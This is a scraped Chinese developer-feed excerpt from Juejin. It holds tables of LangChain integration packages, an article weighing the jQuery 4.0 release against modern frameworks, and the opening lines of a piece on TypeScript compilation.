<h5 data-id="heading-9">二，向量数据库适配包（对接各类向量存储）</h5>









































<table><thead><tr><th>包名</th><th>核心定位</th><th>关键能力 / 导出内容</th><th>适用场景</th></tr></thead><tbody><tr><td>langchain-pinecone</td><td>对接 Pinecone 向量数据库</td><td>1，向量存储操作类 2， 翻译工具 3，嵌入模型</td><td>云端向量存储、大规模 RAG 场景的检索</td></tr><tr><td>langchain-qdrant</td><td>对接 Qdrant 向量数据库</td><td>向量存储操作类（代码库配置引用，无具体导出）</td><td>轻量向量存储、本地 / 云端混合部署的 RAG 场景</td></tr><tr><td>langchain-redis</td><td>对接 Redis 向量存储</td><td>向量存储操作类（代码库配置引用）</td><td>缓存 + 向量存储一体化、低延迟的检索场景</td></tr><tr><td>langchain-weaviate</td><td>对接 Weaviate 向量数据</td><td>1，向量存储操作类 2，翻译工具</td><td>语义检索、结合知识图谱的向量检索场景</td></tr><tr><td>langchain-mongodb</td><td>对接 MongoDB 生态</td><td>1，向量存储 2，聊天记录存储 3，缓存 / 通用存储</td><td>MongoDB 中存储向量、聊天历史，做一体化数据管理</td></tr></tbody></table>
<h5 data-id="heading-10">三，工具 / 其他服务适配包</h5>





























<table><thead><tr><th>包名</th><th>核心定位</th><th>关键能力 / 导出内容</th><th>适用场景</th></tr></thead><tbody><tr><td>langchain-exa</td><td>对接 Exa 搜索工具</td><td>导出检索器、工具类</td><td>精准网页内容检索、深度爬取，补充 RAG 信息</td></tr><tr><td>langchain-mixedbread-ai</td><td>对接 Mixedbread AI 服务</td><td>1，嵌入模型 2， 重排序工具</td><td>生成文本嵌入向量、优化检索结果排序</td></tr><tr><td>langchain-tavily</td><td>对接 Tavily 搜索工具</td><td>搜索工具类（代码库配置引用）</td><td>实时网络搜索、为 LLM 补充最新外部信息</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[jQuery 4.0 发布：是否仍值得使用？]]></title>    <link>https://juejin.cn/post/7596906473307111474</link>    <guid>https://juejin.cn/post/7596906473307111474</guid>    <pubDate>2026-01-20T01:19:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473307111474" data-draft-id="7596983314805702706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="jQuery 4.0 发布：是否仍值得使用？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-20T01:19:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="橙序员小站"/> <meta itemprop="url" content="https://juejin.cn/user/1546375522426169"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            jQuery 4.0 发布：是否仍值得使用？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1546375522426169/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    橙序员小站
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:19:40.000Z" title="Tue Jan 20 2026 01:19:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">jQuery 4.0 的重大变更</h2>
<p>jQuery 4.0 的发布可谓是一次大刀阔斧的变革，许多变化不仅反映了 jQuery 的演变，也折射出现代 JavaScript 的发展趋势。下面我们来深入剖析一下这些重大变更。</p>
<h3 data-id="heading-1">1. 从 AMD 迁移到 ESM</h3>
<p>首先，jQuery 4.0 把模块加载的方式从 AMD（异步模块定义）迁移到了 ESM（ES模块）。这不仅顺应了现代 JavaScript 的发展方向，还与如今主流的模块化标准接轨。这样做的好处是，开发者可以更方便地使用原生的模块系统，减少对外部库的依赖。你可能会问：“这对我有什么影响？”其实，使用 ESM 可以让你的代码更加简洁，构建工具也能更高效地处理依赖关系。</p>
<h3 data-id="heading-2">2. 移除过时 API</h3>
<p>接下来，jQuery 4.0 移除了一些过时的 API，例如 <code>jQuery.isArray</code>。这一变化强调了原生 JavaScript 的强大能力，特别是 <code>Array.isArray</code> 的广泛支持。正如 Reddit 用户 u/bill_1992 所说：“原生 JS 的进步让很多 jQuery 的 API 变得多余。”这意味着，如果你还在使用这些老旧的 API，现在是时候转向原生方法了，毕竟，它们更快、更轻量。</p>
<h3 data-id="heading-3">3. 调整事件处理顺序</h3>
<p>另外，jQuery 4.0 调整了事件处理的顺序，统一了各大浏览器的行为。以往，不同浏览器在处理焦点和模糊事件时有不同的表现，造成了许多兼容性问题。现在，开发者不再需要为这个问题烦恼，统一的事件处理顺序将大大简化跨浏览器开发的复杂性。这无疑是提高开发效率的一大助力。</p>
<h3 data-id="heading-4">4. ‘Slim’ 构建版本去掉 Deferreds</h3>
<p>值得一提的是，jQuery 的‘Slim’构建版本去掉了 Deferreds。这是因为原生 Promises 的普及使得 Deferreds 的使用变得不再必要。很多人可能会问：“去掉这部分功能是不是影响使用？”其实并不会。原生 Promises 的功能已经非常强大，且使用起来更加简洁。就像 u/qubedView 评论的那样：“jQuery 依然活着，但大家都在用更现代的工具。”</p>
<h3 data-id="heading-5">5. jQuery 的演变与适应性</h3>
<p>这些变化表明，jQuery 正在不断演变和适应新的开发环境。虽然有些人可能会质疑 jQuery 是否仍值得使用，尤其是在构建新的 web 应用时，但 jQuery 的存在依然有其价值。正如一位用户所说：“jQuery 解决了我们在 IE 时代的许多痛点，现在依然是个好工具，只要我们用得其所。”</p>
<p>总体来看，jQuery 4.0 的这些变更不仅是对过去的反思，更是对未来的一种适应。随着前端技术的不断发展，开发者们也在不断寻求更高效的工具和方法。你觉得 jQuery 4.0 的这些变化，对你的开发工作有什么帮助？欢迎在评论区分享你的看法！</p>
<h2 data-id="heading-6">jQuery 的历史与影响</h2>
<p>jQuery，作为一个前端开发工具，经历了20年的风风雨雨，真的可以说是前端开发中的一场革命。它的出现，彻底改变了我们与浏览器的互动方式，让复杂的 DOM 操作变得简单易懂。尤其是在 IE 的统治时代，jQuery 就像一把钥匙，打开了各种技术大门，极大地降低了开发者的技术门槛。</p>
<p>回想起早期的网页开发，IE 兼容性问题严重，开发者每天都在与各种浏览器的“奇葩行为”作斗争。正是在这样的背景下，jQuery 应运而生。它提供了一套简洁的 API，让开发者可以不再为浏览器差异而烦恼，轻松处理事件、动画和 AJAX 请求。正如 Reddit 一位用户所说，jQuery 让我们在那个时代的网页开发变得“更加可忍受”。</p>
<p>然而，随着技术的发展，jQuery 的使用场景逐渐减少。现在，许多现代框架和原生 JavaScript 的功能已经可以覆盖 jQuery 的大部分用途。比如，有开发者在讨论中提到，很多 jQuery 的 API 已经被浏览器原生的功能所替代，像 <code>Array.isArray</code> 这类函数，现在根本不需要 jQuery 去实现。即使如此，jQuery 依然有其存在的价值，特别是在一些老旧项目或快速开发的场景下，jQuery 仍然是个好帮手。</p>
<p>很多开发者仍然依赖 jQuery 来快速解决 DOM 操作的问题。就像一位 Reddit 用户分享的，“我用了 jQuery 已经很多年了，因为它简单、方便，能够快速搞定需要的功能。”这其实反映出一种现实：在开发的过程中，效率往往是第一位的，使用 jQuery 能够让你迅速上手，完成任务。</p>
<p>虽说 jQuery 的传奇地位不容小觑，它也为后续的框架和库铺平了道路。jQuery 的成功，促使了一大批现代前端框架的诞生，比如 React 和 Vue。它们在理念上都受到了 jQuery 的影响，强调简化开发者的使用体验。正如有人指出的，jQuery 是一种更为通用的解决方案，而许多现代框架则是针对特定问题而设计的。</p>
<p>在这个技术不断迭代的时代，jQuery 的存在意义和使用场景正在不断变化。虽说新的框架层出不穷，有人甚至认为在新项目中使用 jQuery 是个“遗老遗少”的选择，但不能否认的是，jQuery 仍然是一个值得关注的工具。毕竟，很多开发者还是喜欢用它来快速上手，完成项目，而不必深入研究复杂的框架。</p>
<p>总的来说，jQuery 在过去20年里留下了深刻的印记，帮助无数开发者渡过了艰难的开发时光。虽然它的使用逐渐减少，但在合适的场景下，jQuery 依然能发挥其独特的价值。对于我们这些开发者而言，重要的是在合适的时机，选择合适的工具来解决问题，而 jQuery，仍然可能是其中之一。</p>
<h2 data-id="heading-7">争议与观点分析</h2>
<p>随着 jQuery 4.0 的发布，开发者们对它的未来展开了热烈讨论。有人认为，在新项目中使用 jQuery 的合适性值得进一步探讨。其实，这个问题并不简单。随着前端技术的发展，新的框架层出不穷，jQuery 的位置也在不断被重新审视。</p>
<p>首先，许多开发者认为 jQuery 的简单性是它持续受欢迎的重要原因。比如，评论者 u/LieNaive4921 表示，虽然可以用原生 JavaScript 替代，但 jQuery 的易用性和简洁的语法让他更愿意继续使用。毕竟，开发者们并不总是追求最新的技术，很多时候“能用就是好”。这在快速迭代的开发过程中尤其明显，时间就是金钱，而 jQuery 提供了一种“快搞定”的方案。</p>
<p>然而，现代框架如 React、Vue 和 Angular 的崛起，确实对 jQuery 的地位构成了一定威胁。评论者 u/cheezballs 直言不讳地问，为什么在新的绿色应用中还要使用 jQuery？在他们看来，jQuery 似乎已经不再适应当前复杂的开发环境。尤其是前端开发逐渐转向组件化和单页应用（SPA）模式，这些框架在处理数据绑定和状态管理方面的优势明显。</p>
<p>开发者社区对 jQuery 的看法也呈现出明显的分歧。一方面，有人怀念 jQuery 在互联网早期为开发者所做的贡献，认为它是“让网页开发变得更容易”的工具。另一方面，越来越多的开发者则认为，jQuery 的存在是对现代开发框架的一种干扰。在 Reddit 讨论中，u/bugtank 的评论“Nature is healing”恰好反映了这种观点——随着技术的发展，自然会有新旧交替。</p>
<p>其实，一些老开发者依然钟情于 jQuery，主要是因为他们在这个工具中找到了熟悉感。u/LessonStudio 提到，jQuery 是一个非常通用的工具，能够解决许多特定的问题。对于他们来说，使用 jQuery 就像是穿上一双舒适的老鞋，不需要适应新技术带来的学习曲线。这种情况在许多老项目中尤为明显，很多开发者宁愿维护已有的代码，而不是冒险重构。</p>
<p>总的来说，jQuery 无疑在前端开发史上留下了浓墨重彩的一笔，但面对现代技术的迅猛发展，它是否仍然值得使用？这个问题并没有标准答案，关键在于你的需求和项目的性质。作为开发者，我们需要根据具体情况做出选择。你怎么看？在你的项目中，jQuery 还会是一个选项吗？</p>
<h2 data-id="heading-8">未来展望与技术趋势</h2>
<p>jQuery 4.0 的发布，标志着一个时代的延续与转变。这不仅仅是一个版本的更新，更是对我们前端开发者的一种提醒：技术在不断进步。正如一位评论者所说，这次更新的很多内容都是在“去除”过时的API，反映出原生JavaScript的强大。其实，这也在预示着开发者们可能需要重新审视jQuery在现代开发中的地位。</p>
<h3 data-id="heading-9">jQuery与原生JS的结合</h3>
<p>随着原生JavaScript的日益成熟，很多jQuery曾经解决的问题，如<code>Array.isArray</code>、<code>Promise</code>等，已经有了更为标准化的原生解决方案。开发者们开始思考：在新项目中，是否还需要依赖jQuery？很多人认为，使用原生JS可以减少额外的依赖，提高性能。毕竟，现代浏览器的兼容性已经好到让jQuery的存在变得可有可无。</p>
<p>尽管如此，jQuery依然有其独特的魅力。它简单易用，尤其是在处理DOM操作和事件时，依然能为很多开发者提供便利。从这个角度看，jQuery是否会逐渐转变为一种“工具”而非必需品，或许才是未来的方向。</p>
<h3 data-id="heading-10">前端生态的快速变革</h3>
<p>在快速变化的前端生态中，jQuery的未来似乎面临挑战。面对React、Vue等现代框架的崛起，很多开发者开始质疑jQuery的使用价值。有评论指出，jQuery曾经是“让网页开发变得更轻松”的工具，如今却逐渐被更高效的解决方案取代。</p>
<p>不过，我们不能忽视jQuery的历史贡献。它帮助无数开发者在IE时代渡过难关，现在仍然在一些老旧项目中发挥着作用。那么，jQuery在未来的定位到底是怎样的呢？是继续作为一种“过渡”工具，还是需要为新时代的开发者重新定义？</p>
<h3 data-id="heading-11">关键技术趋势</h3>
<p>在讨论jQuery的未来时，几个技术趋势也值得关注。首先是ESM（ECMAScript Modules）的推广，这使得模块化开发变得更加标准化。其次是原生功能的崛起，很多曾经需要依赖jQuery实现的功能，现在都可以用原生JS轻松实现。</p>
<p>此外，随着前端框架的快速迭代，开发者们也在寻找更轻量的解决方案。在这种背景下，jQuery是否会逐渐被视为“旧时代的产物”？我们需要认真思考这个问题。</p>
<h3 data-id="heading-12">找到传统与新兴技术之间的平衡</h3>
<p>对于开发者来说，面对传统技术与新兴技术的碰撞，如何找到平衡是一大挑战。一方面，jQuery带来的简洁与便捷是无可替代的；另一方面，学习和掌握新技术也是提升自身竞争力的关键。</p>
<p>建议大家在选择使用jQuery时，可以考虑项目的具体需求。如果是维护老项目，使用jQuery无疑是高效的选择；但在新项目中，评估原生JS和现代框架的优势，将会是更加明智的决策。</p>
<p>总的来说，jQuery 4.0的发布不仅仅是一个版本号的更新，而是一个提醒：技术永远在变化，作为开发者，我们需要不断学习与适应。无论是jQuery，还是原生JS，或是各种现代框架，重要的是找到最适合自己项目的工具。你怎么看待这个问题？在你的项目中，jQuery还有用武之地吗？欢迎在评论区分享你的看法！</p>
<h2 data-id="heading-13">总结与讨论</h2>
<p>jQuery 4.0 的发布无疑是前端开发领域的一个有趣里程碑，值得我们关注。随着技术的快速发展，jQuery 的地位似乎在逐渐被其他新技术所取代，但它依然保留着一部分开发者的热爱。正如 Reddit 用户 u/bill_1992 所提到的，jQuery 在过去的辉煌不容忽视，然而如今，原生 JavaScript 的发展已让很多 jQuery 的功能变得多余。</p>
<p>在这次更新中，jQuery 移除了许多不再必要的 API，这其实反映了一个趋势——现代浏览器的原生功能得到了极大的提升。虽然 jQuery 仍然可以让 DOM 操作变得简单，但我们不得不问：在新的项目中，使用 jQuery 还有必要吗？u/cheezballs 提出的“为什么在任何新项目上使用这个？”确实值得我们深思。</p>
<p>我鼓励大家分享你们对 jQuery 的看法与使用经验。你是 jQuery 的忠实粉丝，还是早已转向其他框架？无论是出于习惯，还是因为它确实能解决问题，大家的声音都值得被听见。</p>
<p>那么，jQuery 和新技术如何共存呢？从很多开发者的评论来看，jQuery 的作用并不是完全消失，而是转变成了一种工具，当我们需要快速开发或处理简单任务时，它依然能派上用场。u/LessonStudio 提到了 jQuery 的通用性，这也是它在众多框架中能继续生存的重要原因。</p>
<p>接下来，我们要考虑的是在这场技术变革中，哪些工具最适合你的项目？要根据项目的需求来选择工具。如果你在做一个小型项目，jQuery 可能会让你的开发更加高效；而在大型应用中，现代框架如 React、Vue 或 Angular 可能会更合适。因此，关键在于找到适合你项目的最佳解决方案，而不是盲目追随潮流。</p>
<p>展望未来，前端开发的主角将会是谁？随着技术的更新换代，新的框架和工具层出不穷。虽然 jQuery 依然在某些领域占有一席之地，但更复杂的应用场景正在被 React、Vue 等框架所占领。可以说，未来的前端开发将是一个多元化的时代，各种工具并存，开发者需要根据具体情况灵活选择。</p>
<p>总之，jQuery 4.0 的发布提醒我们，不论技术如何发展，选择工具的最终目标是让开发变得更简单、更高效。希望大家能够积极分享自己的看法和经历，让我们一起探讨这个技术进步带来的新机遇！</p>
<hr/>
<h2 data-id="heading-14">参考来源</h2>
<p>[1] <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reddit.com%2Fr%2Fprogramming%2Fcomments%2F1qfxo89%2Fjquery_40_released%2F" target="_blank" title="https://www.reddit.com/r/programming/comments/1qfxo89/jquery_40_released/" ref="nofollow noopener noreferrer">jQuery 4.0 released</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript工作流深度解析：从.ts到.js发生了什么？]]></title>    <link>https://juejin.cn/post/7596919439019737097</link>    <guid>https://juejin.cn/post/7596919439019737097</guid>    <pubDate>2026-01-20T01:19:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019737097" data-draft-id="7596687515030306842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript工作流深度解析：从.ts到.js发生了什么？"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-20T01:19:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript工作流深度解析：从.ts到.js发生了什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:19:47.000Z" title="Tue Jan 20 2026 01:19:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>当我们在IDE中写下 <code>const name: string = ‘TypeScript’</code> 时，这行优雅的类型注解最终如何变成浏览器能理解的 JavaScript ？本篇文章将深入TypeScript编译器的核心，揭开从.ts到.js的神秘面纱。</p>
</blockquote>
<h2 data-id="heading-0">TypeScript编译全景图</h2>
<p>首先，让我们通过一张完整的流程图来理解TypeScript编译的全过程：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20af6d69a8474308a5661b6da288eb0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3VoZW5fbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476786&amp;x-signature=npF6iXLDjfUaevhpX8f6nGqSpD4%3D" alt="ts到js编译图.png" loading="lazy"/></p>
<h2 data-id="heading-1">tsc编译全过程解析</h2>
<h3 data-id="heading-2">阶段一：解析阶段（Parsing）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 输入：TypeScript源代码</span>
